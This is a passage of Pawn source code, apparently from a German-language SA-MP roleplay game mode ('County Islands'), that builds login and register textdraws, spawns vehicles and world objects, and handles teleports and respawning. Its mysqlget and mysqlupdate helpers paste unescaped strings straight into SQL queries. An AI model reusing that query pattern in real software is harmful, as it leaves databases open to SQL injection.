	TextDrawFont(EssensMenu[11], 2);
	TextDrawLetterSize(EssensMenu[11], 0.359999, 2.200000);
	TextDrawColor(EssensMenu[11], -1);
	TextDrawSetOutline(EssensMenu[11], 0);
	TextDrawSetProportional(EssensMenu[11], 1);
	TextDrawSetShadow(EssensMenu[11], 1);
    TextDrawSetSelectable(EssensMenu[11], 1);
    TextDrawUseBox(EssensMenu[11], 1);
	TextDrawBoxColor(EssensMenu[11], 0xFFFFFF00);
	TextDrawTextSize(EssensMenu[11], 487.000000, 20.000000);
	EssensMenu[12] = TextDrawCreate(343.000000, 173.000000, "_");
	TextDrawBackgroundColor(EssensMenu[12], 255);
	TextDrawFont(EssensMenu[12], 1);
	TextDrawLetterSize(EssensMenu[12], 0.500000, 14.900003);
	TextDrawColor(EssensMenu[12], -1);
	TextDrawSetOutline(EssensMenu[12], 0);
	TextDrawSetProportional(EssensMenu[12], 1);
	TextDrawSetShadow(EssensMenu[12], 1);
	TextDrawUseBox(EssensMenu[12], 1);
	TextDrawBoxColor(EssensMenu[12], -8257281);
	TextDrawTextSize(EssensMenu[12], 338.000000, 1.000000);
	EssensMenu[13] = TextDrawCreate(175.000000, 173.000000, "_");
	TextDrawBackgroundColor(EssensMenu[13], 255);
	TextDrawFont(EssensMenu[13], 1);
	TextDrawLetterSize(EssensMenu[13], 0.500000, -0.499996);
	TextDrawColor(EssensMenu[13], -1);
	TextDrawSetOutline(EssensMenu[13], 0);
	TextDrawSetProportional(EssensMenu[13], 1);
	TextDrawSetShadow(EssensMenu[13], 1);
	TextDrawUseBox(EssensMenu[13], 1);
	TextDrawBoxColor(EssensMenu[13], -8257281);
	TextDrawTextSize(EssensMenu[13], 487.000000, 1.000000);

	LoginDraw[0] = TextDrawCreate(649.000000, 342.000000, "  ");
	TextDrawBackgroundColor(LoginDraw[0], 255);
	TextDrawFont(LoginDraw[0], 1);
	TextDrawLetterSize(LoginDraw[0], 0.500000, 12.000001);
	TextDrawColor(LoginDraw[0], -1);
	TextDrawSetOutline(LoginDraw[0], 0);
	TextDrawSetProportional(LoginDraw[0], 1);
	TextDrawSetShadow(LoginDraw[0], 1);
	TextDrawUseBox(LoginDraw[0], 1);
	TextDrawBoxColor(LoginDraw[0], 336860415);
	TextDrawTextSize(LoginDraw[0], -13.000000, 12.000000);
	TextDrawSetSelectable(LoginDraw[0], 0);

	LoginDraw[1] = TextDrawCreate(649.000000, -8.000000, "  ");
	TextDrawBackgroundColor(LoginDraw[1], 255);
	TextDrawFont(LoginDraw[1], 1);
	TextDrawLetterSize(LoginDraw[1], 0.500000, 12.000001);
	TextDrawColor(LoginDraw[1], -1);
	TextDrawSetOutline(LoginDraw[1], 0);
	TextDrawSetProportional(LoginDraw[1], 1);
	TextDrawSetShadow(LoginDraw[1], 1);
	TextDrawUseBox(LoginDraw[1], 1);
	TextDrawBoxColor(LoginDraw[1], 336860415);
	TextDrawTextSize(LoginDraw[1], -13.000000, 12.000000);
	TextDrawSetSelectable(LoginDraw[1], 0);

	LoginDraw[2] = TextDrawCreate(159.000000, 49.000000, ".");
	TextDrawBackgroundColor(LoginDraw[2], 255);
	TextDrawFont(LoginDraw[2], 1);
	TextDrawLetterSize(LoginDraw[2], 27.640068, -0.400000);
	TextDrawColor(LoginDraw[2], 2097152255);
	TextDrawSetOutline(LoginDraw[2], 0);
	TextDrawSetProportional(LoginDraw[2], 1);
	TextDrawSetShadow(LoginDraw[2], 1);
	TextDrawSetSelectable(LoginDraw[2], 0);

	LoginDraw[3] = TextDrawCreate(228.000000, 22.000000, "County Islands");
	TextDrawBackgroundColor(LoginDraw[3], 2097152255);
	TextDrawFont(LoginDraw[3], 3);
	TextDrawLetterSize(LoginDraw[3], 0.629998, 1.899999);
	TextDrawColor(LoginDraw[3], -1);
	TextDrawSetOutline(LoginDraw[3], 0);
	TextDrawSetProportional(LoginDraw[3], 1);
	TextDrawSetShadow(LoginDraw[3], 1);
	TextDrawSetSelectable(LoginDraw[3], 0);

	LoginDraw[4] = TextDrawCreate(652.000000, 341.000000, ".");
	TextDrawBackgroundColor(LoginDraw[4], 255);
	TextDrawFont(LoginDraw[4], 1);
	TextDrawLetterSize(LoginDraw[4], 0.500000, -0.199999);
	TextDrawColor(LoginDraw[4], -1);
	TextDrawSetOutline(LoginDraw[4], 0);
	TextDrawSetProportional(LoginDraw[4], 1);
	TextDrawSetShadow(LoginDraw[4], 1);
	TextDrawUseBox(LoginDraw[4], 1);
	TextDrawBoxColor(LoginDraw[4], 1929380095);
	TextDrawTextSize(LoginDraw[4], -5.000000, -69.000000);
	TextDrawSetSelectable(LoginDraw[4], 0);

	LoginDraw[5] = TextDrawCreate(673.000000, 103.000000, ".");
	TextDrawBackgroundColor(LoginDraw[5], 255);
	TextDrawFont(LoginDraw[5], 1);
	TextDrawLetterSize(LoginDraw[5], 0.500000, -0.199999);
	TextDrawColor(LoginDraw[5], -1);
	TextDrawSetOutline(LoginDraw[5], 0);
	TextDrawSetProportional(LoginDraw[5], 1);
	TextDrawSetShadow(LoginDraw[5], 1);
	TextDrawUseBox(LoginDraw[5], 1);
	TextDrawBoxColor(LoginDraw[5], 1929380095);
	TextDrawTextSize(LoginDraw[5], -5.000000, -69.000000);
	TextDrawSetSelectable(LoginDraw[5], 0);

	LoginDraw[6] = TextDrawCreate(123.000000, 137.000000, "                         ");
	TextDrawBackgroundColor(LoginDraw[6], 255);
	TextDrawFont(LoginDraw[6], 1);
	TextDrawLetterSize(LoginDraw[6], 0.500000, 0.099999);
	TextDrawColor(LoginDraw[6], -1);
	TextDrawSetOutline(LoginDraw[6], 1);
	TextDrawSetProportional(LoginDraw[6], 1);
	TextDrawUseBox(LoginDraw[6], 1);
	TextDrawBoxColor(LoginDraw[6], -1962934072);
	TextDrawTextSize(LoginDraw[6], 6.000000, -220.000000);
	TextDrawSetSelectable(LoginDraw[6], 0);

	LoginDraw[7] = TextDrawCreate(123.000000, 160.000000, "                                 ");
	TextDrawBackgroundColor(LoginDraw[7], 255);
	TextDrawFont(LoginDraw[7], 1);
	TextDrawLetterSize(LoginDraw[7], 0.799998, 0.299998);
	TextDrawColor(LoginDraw[7], -1);
	TextDrawSetOutline(LoginDraw[7], 0);
	TextDrawSetProportional(LoginDraw[7], 1);
	TextDrawSetShadow(LoginDraw[7], 1);
	TextDrawUseBox(LoginDraw[7], 1);
	TextDrawBoxColor(LoginDraw[7], 2139062166);
	TextDrawTextSize(LoginDraw[7], 6.000000, 60.000000);
	TextDrawSetSelectable(LoginDraw[7], 0);

	LoginDraw[8] = TextDrawCreate(108.000000, 172.000000, "                         ");
	TextDrawBackgroundColor(LoginDraw[8], 255);
	TextDrawFont(LoginDraw[8], 1);
	TextDrawLetterSize(LoginDraw[8], 0.500000, 0.099999);
	TextDrawColor(LoginDraw[8], -1);
	TextDrawSetOutline(LoginDraw[8], 1);
	TextDrawSetProportional(LoginDraw[8], 1);
	TextDrawUseBox(LoginDraw[8], 1);
	TextDrawBoxColor(LoginDraw[8], 168562276);
	TextDrawTextSize(LoginDraw[8], 19.000000, -133.000000);
	TextDrawSetSelectable(LoginDraw[8], 0);

	LoginDraw[9] = TextDrawCreate(37.000000, 176.000000, "einloggen");
	TextDrawBackgroundColor(LoginDraw[9], 255);
	TextDrawFont(LoginDraw[9], 3);
	TextDrawLetterSize(LoginDraw[9], 0.329999, 1.500000);
	TextDrawColor(LoginDraw[9], -1);
	TextDrawSetOutline(LoginDraw[9], 0);
	TextDrawSetProportional(LoginDraw[9], 1);
	TextDrawSetShadow(LoginDraw[9], 0);
	TextDrawTextSize(LoginDraw[9], 105.000000, 14.000000);
	TextDrawSetSelectable(LoginDraw[9], 1);

	LoginDraw[10] = TextDrawCreate(10.000000, 135.000000, "LOGIN");
	TextDrawBackgroundColor(LoginDraw[10], 168431349);
	TextDrawFont(LoginDraw[10], 2);
	TextDrawLetterSize(LoginDraw[10], 0.139999, 1.199999);
	TextDrawColor(LoginDraw[10], -1);
	TextDrawSetOutline(LoginDraw[10], 0);
	TextDrawSetProportional(LoginDraw[10], 1);
	TextDrawSetShadow(LoginDraw[10], 1);
	TextDrawSetSelectable(LoginDraw[10], 0);

	LoginDraw[11] = TextDrawCreate(11.000000, 147.000000, "Account gefunden, Du kannst dich nun einloggen!");
	TextDrawBackgroundColor(LoginDraw[11], 255);
	TextDrawFont(LoginDraw[11], 1);
	TextDrawLetterSize(LoginDraw[11], 0.129999, 0.799998);
	TextDrawColor(LoginDraw[11], -1);
	TextDrawSetOutline(LoginDraw[11], 0);
	TextDrawSetProportional(LoginDraw[11], 1);
	TextDrawSetShadow(LoginDraw[11], 0);
	TextDrawSetSelectable(LoginDraw[11], 0);

	LoginDraw[12] = TextDrawCreate(27.000000, 214.000000, "Informationen");
	TextDrawBackgroundColor(LoginDraw[12], 255);
	TextDrawFont(LoginDraw[12], 3);
	TextDrawLetterSize(LoginDraw[12], 0.309999, 1.600000);
	TextDrawColor(LoginDraw[12], -1);
	TextDrawSetOutline(LoginDraw[12], 0);
	TextDrawSetProportional(LoginDraw[12], 1);
	TextDrawSetShadow(LoginDraw[12], 0);
	TextDrawTextSize(LoginDraw[12], 105.000000, 14.000000);
	TextDrawSetSelectable(LoginDraw[12], 1);

	LoginDraw[13] = TextDrawCreate(108.000000, 211.000000, "                         ");
	TextDrawBackgroundColor(LoginDraw[13], 255);
	TextDrawFont(LoginDraw[13], 1);
	TextDrawLetterSize(LoginDraw[13], 0.500000, 0.099999);
	TextDrawColor(LoginDraw[13], -1);
	TextDrawSetOutline(LoginDraw[13], 1);
	TextDrawSetProportional(LoginDraw[13], 1);
	TextDrawUseBox(LoginDraw[13], 1);
	TextDrawBoxColor(LoginDraw[13], 168562276);
	TextDrawTextSize(LoginDraw[13], 19.000000, -133.000000);
	TextDrawSetSelectable(LoginDraw[13], 0);

	RegisterDraw[0] = TextDrawCreate(649.000000, 342.000000, "  ");
	TextDrawBackgroundColor(RegisterDraw[0], 255);
	TextDrawFont(RegisterDraw[0], 1);
	TextDrawLetterSize(RegisterDraw[0], 0.500000, 12.000001);
	TextDrawColor(RegisterDraw[0], -1);
	TextDrawSetOutline(RegisterDraw[0], 0);
	TextDrawSetProportional(RegisterDraw[0], 1);
	TextDrawSetShadow(RegisterDraw[0], 1);
	TextDrawUseBox(RegisterDraw[0], 1);
	TextDrawBoxColor(RegisterDraw[0], 336860415);
	TextDrawTextSize(RegisterDraw[0], -13.000000, 12.000000);
	TextDrawSetSelectable(RegisterDraw[0], 0);

	RegisterDraw[1] = TextDrawCreate(649.000000, -8.000000, "  ");
	TextDrawBackgroundColor(RegisterDraw[1], 255);
	TextDrawFont(RegisterDraw[1], 1);
	TextDrawLetterSize(RegisterDraw[1], 0.500000, 12.000001);
	TextDrawColor(RegisterDraw[1], -1);
	TextDrawSetOutline(RegisterDraw[1], 0);
	TextDrawSetProportional(RegisterDraw[1], 1);
	TextDrawSetShadow(RegisterDraw[1], 1);
	TextDrawUseBox(RegisterDraw[1], 1);
	TextDrawBoxColor(RegisterDraw[1], 336860415);
	TextDrawTextSize(RegisterDraw[1], -13.000000, 12.000000);
	TextDrawSetSelectable(RegisterDraw[1], 0);

	RegisterDraw[2] = TextDrawCreate(159.000000, 49.000000, ".");
	TextDrawBackgroundColor(RegisterDraw[2], 255);
	TextDrawFont(RegisterDraw[2], 1);
	TextDrawLetterSize(RegisterDraw[2], 27.640068, -0.400000);
	TextDrawColor(RegisterDraw[2], 2097152255);
	TextDrawSetOutline(RegisterDraw[2], 0);
	TextDrawSetProportional(RegisterDraw[2], 1);
	TextDrawSetShadow(RegisterDraw[2], 1);
	TextDrawSetSelectable(RegisterDraw[2], 0);

	RegisterDraw[3] = TextDrawCreate(228.000000, 22.000000, "County Islands");
	TextDrawBackgroundColor(RegisterDraw[3], 2097152255);
	TextDrawFont(RegisterDraw[3], 3);
	TextDrawLetterSize(RegisterDraw[3], 0.629998, 1.899999);
	TextDrawColor(RegisterDraw[3], -1);
	TextDrawSetOutline(RegisterDraw[3], 0);
	TextDrawSetProportional(RegisterDraw[3], 1);
	TextDrawSetShadow(RegisterDraw[3], 1);
	TextDrawSetSelectable(RegisterDraw[3], 0);

	RegisterDraw[4] = TextDrawCreate(652.000000, 341.000000, ".");
	TextDrawBackgroundColor(RegisterDraw[4], 255);
	TextDrawFont(RegisterDraw[4], 1);
	TextDrawLetterSize(RegisterDraw[4], 0.500000, -0.199999);
	TextDrawColor(RegisterDraw[4], -1);
	TextDrawSetOutline(RegisterDraw[4], 0);
	TextDrawSetProportional(RegisterDraw[4], 1);
	TextDrawSetShadow(RegisterDraw[4], 1);
	TextDrawUseBox(RegisterDraw[4], 1);
	TextDrawBoxColor(RegisterDraw[4], 1929380095);
	TextDrawTextSize(RegisterDraw[4], -5.000000, -69.000000);
	TextDrawSetSelectable(RegisterDraw[4], 0);

	RegisterDraw[5] = TextDrawCreate(673.000000, 103.000000, ".");
	TextDrawBackgroundColor(RegisterDraw[5], 255);
	TextDrawFont(RegisterDraw[5], 1);
	TextDrawLetterSize(RegisterDraw[5], 0.500000, -0.199999);
	TextDrawColor(RegisterDraw[5], -1);
	TextDrawSetOutline(RegisterDraw[5], 0);
	TextDrawSetProportional(RegisterDraw[5], 1);
	TextDrawSetShadow(RegisterDraw[5], 1);
	TextDrawUseBox(RegisterDraw[5], 1);
	TextDrawBoxColor(RegisterDraw[5], 1929380095);
	TextDrawTextSize(RegisterDraw[5], -5.000000, -69.000000);
	TextDrawSetSelectable(RegisterDraw[5], 0);

	RegisterDraw[6] = TextDrawCreate(123.000000, 137.000000, "                         ");
	TextDrawBackgroundColor(RegisterDraw[6], 255);
	TextDrawFont(RegisterDraw[6], 1);
	TextDrawLetterSize(RegisterDraw[6], 0.500000, 0.099999);
	TextDrawColor(RegisterDraw[6], -1);
	TextDrawSetOutline(RegisterDraw[6], 1);
	TextDrawSetProportional(RegisterDraw[6], 1);
	TextDrawUseBox(RegisterDraw[6], 1);
	TextDrawBoxColor(RegisterDraw[6], -1962934072);
	TextDrawTextSize(RegisterDraw[6], 6.000000, -220.000000);
	TextDrawSetSelectable(RegisterDraw[6], 0);

	RegisterDraw[7] = TextDrawCreate(123.000000, 160.000000, "                                 ");
	TextDrawBackgroundColor(RegisterDraw[7], 255);
	TextDrawFont(RegisterDraw[7], 1);
	TextDrawLetterSize(RegisterDraw[7], 0.799998, 0.299998);
	TextDrawColor(RegisterDraw[7], -1);
	TextDrawSetOutline(RegisterDraw[7], 0);
	TextDrawSetProportional(RegisterDraw[7], 1);
	TextDrawSetShadow(RegisterDraw[7], 1);
	TextDrawUseBox(RegisterDraw[7], 1);
	TextDrawBoxColor(RegisterDraw[7], 2139062166);
	TextDrawTextSize(RegisterDraw[7], 6.000000, 60.000000);
	TextDrawSetSelectable(RegisterDraw[7], 0);

	RegisterDraw[8] = TextDrawCreate(108.000000, 172.000000, "                         ");
	TextDrawBackgroundColor(RegisterDraw[8], 255);
	TextDrawFont(RegisterDraw[8], 1);
	TextDrawLetterSize(RegisterDraw[8], 0.500000, 0.099999);
	TextDrawColor(RegisterDraw[8], -1);
	TextDrawSetOutline(RegisterDraw[8], 1);
	TextDrawSetProportional(RegisterDraw[8], 1);
	TextDrawUseBox(RegisterDraw[8], 1);
	TextDrawBoxColor(RegisterDraw[8], 168562276);
	TextDrawTextSize(RegisterDraw[8], 19.000000, -133.000000);
	TextDrawSetSelectable(RegisterDraw[8], 0);

	RegisterDraw[9] = TextDrawCreate(30.000000, 174.000000, "registrieren");
	//RegisterDraw[9] = TextDrawCreate(33.000000, 172.000000, "registrieren");
	TextDrawBackgroundColor(RegisterDraw[9], 255);
	TextDrawFont(RegisterDraw[9], 3);
	TextDrawLetterSize(RegisterDraw[9], 0.329999, 1.500000);
	TextDrawColor(RegisterDraw[9], -1);
	TextDrawSetOutline(RegisterDraw[9], 0);
	TextDrawSetProportional(RegisterDraw[9], 1);
	TextDrawSetShadow(RegisterDraw[9], 0);
	TextDrawTextSize(RegisterDraw[9], 105.000000, 14.000000);
	TextDrawSetSelectable(RegisterDraw[9], 1);

	RegisterDraw[10] = TextDrawCreate(10.000000, 135.000000, "LOGIN");
	TextDrawBackgroundColor(RegisterDraw[10], 168431349);
	TextDrawFont(RegisterDraw[10], 2);
	TextDrawLetterSize(RegisterDraw[10], 0.139999, 1.199999);
	TextDrawColor(RegisterDraw[10], -1);
	TextDrawSetOutline(RegisterDraw[10], 0);
	TextDrawSetProportional(RegisterDraw[10], 1);
	TextDrawSetShadow(RegisterDraw[10], 1);
	TextDrawSetSelectable(RegisterDraw[10], 0);
	RegisterDraw[11] = TextDrawCreate(11.000000, 147.000000, "Account nicht gefunden, registriere dich!");
	TextDrawBackgroundColor(RegisterDraw[11], 255);
	TextDrawFont(RegisterDraw[11], 1);
	TextDrawLetterSize(RegisterDraw[11], 0.129999, 0.799998);
	TextDrawColor(RegisterDraw[11], -1);
	TextDrawSetOutline(RegisterDraw[11], 0);
	TextDrawSetProportional(RegisterDraw[11], 1);
	TextDrawSetShadow(RegisterDraw[11], 0);
	TextDrawSetSelectable(RegisterDraw[11], 0);

	RegisterDraw[12] = TextDrawCreate(27.000000, 214.000000, "Informationen");
	TextDrawBackgroundColor(RegisterDraw[12], 255);
	TextDrawFont(RegisterDraw[12], 3);
	TextDrawLetterSize(RegisterDraw[12], 0.309999, 1.600000);
	TextDrawColor(RegisterDraw[12], -1);
	TextDrawSetOutline(RegisterDraw[12], 0);
	TextDrawSetProportional(RegisterDraw[12], 1);
	TextDrawSetShadow(RegisterDraw[12], 0);
	TextDrawTextSize(RegisterDraw[12], 105.000000, 14.000000);
	TextDrawSetSelectable(RegisterDraw[12], 1);

	RegisterDraw[13] = TextDrawCreate(108.000000, 211.000000, "                         ");
	TextDrawBackgroundColor(RegisterDraw[13], 255);
	TextDrawFont(RegisterDraw[13], 1);
	TextDrawLetterSize(RegisterDraw[13], 0.500000, 0.099999);
	TextDrawColor(RegisterDraw[13], -1);
	TextDrawSetOutline(RegisterDraw[13], 1);
	TextDrawSetProportional(RegisterDraw[13], 1);
	TextDrawUseBox(RegisterDraw[13], 1);
	TextDrawBoxColor(RegisterDraw[13], 168562276);
	TextDrawTextSize(RegisterDraw[13], 19.000000, -133.000000);
	TextDrawSetSelectable(RegisterDraw[13], 0);


}
KeineRechte(playerid)
{
	SendClientMessage(playerid,COLOR_RED,"Du bist nicht autorisiert diesen Befehl zu benutzen!");
	return 1;
}
mysqlget(const table[],const bedien[],const abfrag[], data[])
{
	new query[128];
	format(query,sizeof(query),"SELECT %s FROM %s WHERE %s",abfrag,table,bedien);
	mysql_query(dbhandle, query, true);
	printf("%s",query);

	if(cache_num_rows())
	{
		cache_get_field_content(0, abfrag, data, dbhandle, 150);

		return true;
	}
	else
	{

		return false;
	}
}
mysqlupdate(const table[],const bedien[],const spalte[],const data[])
{
 	new query[128];
	format(query,sizeof(query),"UPDATE %s SET %s='%s' WHERE %s",table,spalte,data,bedien);
	mysql_query(dbhandle, query);
	printf("%s",query);

}
forward MoveObjektRot(oid,Float:rx, Float:ry, Float:rz, geschw);
public MoveObjektRot(oid,Float:rx, Float:ry, Float:rz, geschw)
{
	new Float:x, Float:y, Float:z, Float:dx, Float:dy, Float:dz;
	GetDynamicObjectRot(oid,x,y,z);
	dx=(rx-x)/geschw;
	dy=(ry-y)/geschw;
	dz=(rz-z)/geschw;
	SetDynamicObjectRot(oid,x+dx,y+dy,z+dz);
	geschw--;
	SetTimerEx("MoveRot",50,0,"dfffdfff",oid,rx,ry,rz,geschw,dx,dy,dz);
	return 1;
}
forward MoveRot(oid,Float:rx, Float:ry, Float:rz, geschw, Float:dx, Float:dy, Float:dz);
public MoveRot(oid,Float:rx, Float:ry, Float:rz, geschw, Float:dx, Float:dy, Float:dz)
{
	new Float:x, Float:y, Float:z;
	GetDynamicObjectRot(oid,x,y,z);
	SetDynamicObjectRot(oid,x+dx,y+dy,z+dz);
	geschw--;
	if(geschw>=1) {
	SetTimerEx("MoveRot",50,0,"dfffdfff",oid,rx,ry,rz,geschw,dx,dy,dz); }
	return 1;
}
PlayerName(playerid)
{
	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid,playername,sizeof playername);
	return playername;
}
forward LS(playerid);
public LS(playerid)
{
    Teleport(playerid,1849.6346,-9281.2666,4.4122);//LS
    SendClientMessage(playerid,0xFEFEFEFF,"Du startest deine Story in Lake Sorten! Viel Erfolg!");
    SendClientMessage(playerid,COLOR_WHITE,"Als erstes solltest Du dir einen {B40404}Personalausweis & Job {FFFFFF}besorgen, den bekommst Du in der Stadthalle (weißes S auf der Map).");
    Freeze(playerid); SetTimerEx("Unfreeze",6000,0,"d",playerid);
	return 1;
}
forward SF(playerid);
public SF(playerid)
{
    Teleport(playerid,6383.0757,-7741.6279,7.8744);//SF
    SendClientMessage(playerid,0xFEFEFEFF,"Du startest deine Story in Santa Felton! Viel Erfolg!");
    SendClientMessage(playerid,0xFEFEFEFF,"Als erstes solltest Du dir einen Personalausweis besorgen, den bekommst Du in der Stadthalle (weißes S auf der Map).");
    Freeze(playerid); SetTimerEx("Unfreeze",6000,0,"d",playerid);
	return 1;
}
Objecte()
{
	for(new x = 0; x < 56; x++)
	{
	    Baumholz[x] = CreateDynamicObjectEx(673,baume[x][0],baume[x][1],baume[x][2],0,0,0,150.0,150.0);
	    Baumstatus[x] = 1;
	    Baumleben[x] = 1000;
	}
	//Müllautos
	ReinigungsFahrzeug[0] = AddStaticVehicleEx(408,1684.7153,-9249.1240,4.9552,178.8403,1,1,300); // Mull1LS
	ReinigungsFahrzeug[1] = AddStaticVehicleEx(408,1684.8938,-9238.4209,4.9563,176.7412,1,1,300); // Mull2
	ReinigungsFahrzeug[2] = AddStaticVehicleEx(408,1680.8138,-9238.3613,4.9492,176.7734,1,1,300); // Mull3
	ReinigungsFahrzeug[3] = AddStaticVehicleEx(408,1676.4786,-9238.1699,4.9475,178.5985,1,1,300); // Mull4
	ReinigungsFahrzeug[4] = AddStaticVehicleEx(408,1671.9293,-9238.0371,4.9382,179.1341,1,1,120); // Mull5
	ReinigungsFahrzeug[5] = AddStaticVehicleEx(408,1667.7100,-9237.9170,4.9360,178.4719,1,1,300); // Mull6
	ReinigungsFahrzeug[6] = AddStaticVehicleEx(408,1667.8085,-9251.4072,4.9495,179.7731,1,1,300); // Mull7
	ReinigungsFahrzeug[7] = AddStaticVehicleEx(408,6630.9873,-7727.3018,4.8036,179.9392,1,1,300); // MullSF1
	ReinigungsFahrzeug[8] = AddStaticVehicleEx(408,6626.6880,-7727.3169,4.7975,178.4229,1,1,300); // MullSF2
	ReinigungsFahrzeug[9] = AddStaticVehicleEx(408,6622.0005,-7727.4395,4.8097,178.6770,1,1,300); // MullSF3
	holzi[0] = AddStaticVehicleEx(478,4312.2085,-8663.0576,4.3865,2.2321,-1,-1, 300); // 1
	holzi[1] = AddStaticVehicleEx(478,4300.1479,-8655.1699,4.3850,245.8816,-1,-1, 300); //2
	holzi[2] = AddStaticVehicleEx(478,4300.1445,-8650.9189,4.3898,243.0879,-1,-1, 300); // 3
	holzi[3] = AddStaticVehicleEx(478,4299.8516,-8645.8809,4.3796,237.3918,-1,-1, 300); // 4
	holzi[4] = AddStaticVehicleEx(478,4305.3584,-8678.0859,4.3891,332.4873,-1,-1, 300); // 5
	//Farmfahrzeuge Mäh/Tracktor/Anhänger
	FarmerFahrzeug[0] = AddStaticVehicleEx(532, 4523.1040,-9268.8555,5.3775, 269.9712, -1, -1,60);
	FarmerFahrzeug[1] = AddStaticVehicleEx(532,4521.4722,-9251.1670,5.3854,268.3758, -1, -1, 60);
	FarmerFahrzeug[2] = AddStaticVehicleEx(532,5691.6426,-9278.5537,5.3720,270.6444, -1, -1, 60);
	FarmerFahrzeug[3] = AddStaticVehicleEx(532,5691.2759,-9267.5557,5.3790,273.1903, -1, -1, 60);
	FarmerFahrzeug[4] = AddStaticVehicleEx(531,5788.6812,-9237.9668,4.3664,134.7986, -1, -1, 60);
	FarmerFahrzeug[5] = AddStaticVehicleEx(531,5792.2515,-9245.9932,4.3693,39.2207, -1, -1, 60);
	FarmerFahrzeug[6] = AddStaticVehicleEx(531,5759.8345,-9240.5176,4.3671,318.7596, -1, -1, 60);
	FarmerFahrzeug[7] = AddStaticVehicleEx(531,5753.4585,-9232.8086,4.3723,223.0426, -1, -1, 60);
	FarmerFahrzeug[8] = AddStaticVehicleEx(531,4565.1924,-9342.7354,4.3738,46.3602, -1, -1, 60);
	FarmerFahrzeug[9] = AddStaticVehicleEx(531,4566.5244,-9334.0938,4.3726,128.2111, -1, -1, 60);
	FarmerFahrzeug[10] = AddStaticVehicleEx(531,4572.6001,-9355.5088,4.3724,92.6112, -1, -1, 60);
	FarmerFahrzeug[11] = AddStaticVehicleEx(531,4569.3062,-9364.5752,4.3696,71.4348, -1, -1, 60);
	FarmerFahrzeug[12] = AddStaticVehicleEx(610, 5802.8745, -9246.3457, 3.7041, 55.0000, -1, -1, 60);
	FarmerFahrzeug[13] = AddStaticVehicleEx(610, 5802.9648, -9237.0586, 3.7041, 127.0000, -1, -1, 60);
	FarmerFahrzeug[14] = AddStaticVehicleEx(610, 5741.7690, -9232.9609, 3.7041, 273.0000, -1, -1, 60);
	FarmerFahrzeug[15] = AddStaticVehicleEx(610, 5744.6592, -9240.0313, 3.7041, -91.0000, -1, -1, 60);
	FarmerFahrzeug[16] = AddStaticVehicleEx(610, 4575.6162, -9334.8760, 3.6991, 135.0000, -1, -1, 60);
	FarmerFahrzeug[17] = AddStaticVehicleEx(610, 4576.7607, -9342.0771, 3.6991, 55.0000, -1, -1, 60);
	FarmerFahrzeug[18] = AddStaticVehicleEx(610, 4578.9922, -9355.3525, 3.6991, 87.0000, -1, -1, 60);
	FarmerFahrzeug[19] = AddStaticVehicleEx(610, 4576.4424, -9365.2637, 3.6991, 87.0000, -1, -1, 60);


	//Taxis
	Taxi[0] = AddStaticVehicleEx(438,6362.4912,-7782.0122,4.3760,269.8905,6,6, 120); // Taxi1SF
	Taxi[1] = AddStaticVehicleEx(420,6355.0342,-7782.0034,4.1556,270.3397,6,6, 120); // Taxi2SF
	Taxi[2] = AddStaticVehicleEx(420,6347.2144,-7782.1655,4.1538,269.5337,6,6, 120); // Taxi3SF
	Taxi[3] = AddStaticVehicleEx(420,1638.1600,-8512.3623,1.9126,269.3499,6,6, 120); // Taxi1
	Taxi[4] = AddStaticVehicleEx(438,1637.8240,-8507.9658,2.1381,271.2381,6,1, 120); // Taxi2
	Taxi[5] = AddStaticVehicleEx(420,1637.6184,-8503.8457,1.9175,89.9549,6,6, 120); // Taxi3
	Taxi[6] = AddStaticVehicleEx(438,1637.9238,-8499.0713,2.1389,89.5628,6,6, 120); // Taxi4
	Taxi[7] = AddStaticVehicleEx(438,1638.2166,-8494.7988,2.1348,89.1596,6,1, 120); // Taxi5
	Taxi[8] = AddStaticVehicleEx(420,1637.9745,-8490.6631,1.9060,89.0213,6,6, 120); // Taxi6
	Taxi[9] = AddStaticVehicleEx(420,1638.4137,-8486.8135,1.9047,266.6505,6,6, 120); // Taxi7

	//Busse
	Bus[0] = AddStaticVehicleEx(431,6615.4771,-7793.2920,4.5085,268.6444,-1,-1, 120); // BusSF1
	Bus[1] = AddStaticVehicleEx(431,6614.8555,-7798.5010,4.5079,269.9060,-1,-1, 120); // BusSF2
	Bus[2] = AddStaticVehicleEx(431,6614.3306,-7803.2534,4.5066,269.7897,-1,-1, 120); // BusSF3
	Bus[3] = AddStaticVehicleEx(431,6614.0645,-7808.3262,4.5116,269.6168,-1,-1, 120); // BusSF4
	Bus[4] = AddStaticVehicleEx(431,1664.5697,-9289.5908,4.4998,270.0919,-1,-1, 120); // BusLS1
	Bus[5] = AddStaticVehicleEx(431,1664.7493,-9285.0527,4.5032,268.8988,-1,-1, 120); // BusLS2
	Bus[6] = AddStaticVehicleEx(431,1664.8516,-9280.3350,4.5049,269.7266,-1,-1, 120); // BusLS3
	Bus[7] = AddStaticVehicleEx(431,1664.9791,-9275.8350,4.5053,269.0689,-1,-1, 120); // BusLS4

	for(new x = 0; x < sizeof(Felder)-1; x++)
	{
	    Weed[x] = CreateDynamicObject(855,Felder[x][0],Felder[x][1],4.25,0,0,0);
	    WeedStatus[x] = 1;
	}

	for(new v = 1; v < MAX_VEHICLES; v++)
	{
	    if(IsValidVehicle(v))
	    {
	        Benzin[v] = AutoDaten[GetVehicleModel(v)-399][MaxBenzin];
	 		FalscherKraftstoff[v] = 0;
			Motorschaden[v] = 0;
			BenzinVerbrauch[v] = 0;
		 	Meter[v] = 0;
		 	Meter2[v] = 0;
		 	SaveCoords(v);
		 	Blaulicht[v] = -1;
		 	if(GetVehicleModel(v) == 578)
			{
			    ADACZone[azoneid] = CreateDynamicCircle(0,0,12.0);
			    AttachDynamicAreaToVehicle(ADACZone[azoneid],v);
			    azoneid++;
			}
	 	}
	 	ADACVehicleStream[v] = -1;
	}
}

forward Leben(playerid);
public Leben(playerid)
{
	if(SpielerInfo[playerid][uTod] != 0)
	{
		new Float:LS12 = GetPlayerDistanceFromPoint(playerid, 1763.3220,-9308.4346,4.4164);
	    new Float:SF12 = GetPlayerDistanceFromPoint(playerid, 6452.5493,-7724.9258,4.3736);
	    if(LS12 > SF12)
	    {
	        Teleport(playerid,6460.8135,-7722.7930,4.3736);
	    }
	    else if(SF12 > LS12)
	    {
	    	Teleport(playerid,1762.4531,-9323.4795,7.9037);
	    }
	    SpielerInfo[playerid][uTod] = 0;
	    SetPlayerFacingAngle(playerid,360);
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid,0);
		GebeLeben(playerid,99.8);
		Unfreeze(playerid);
		ClearAnimations(playerid);
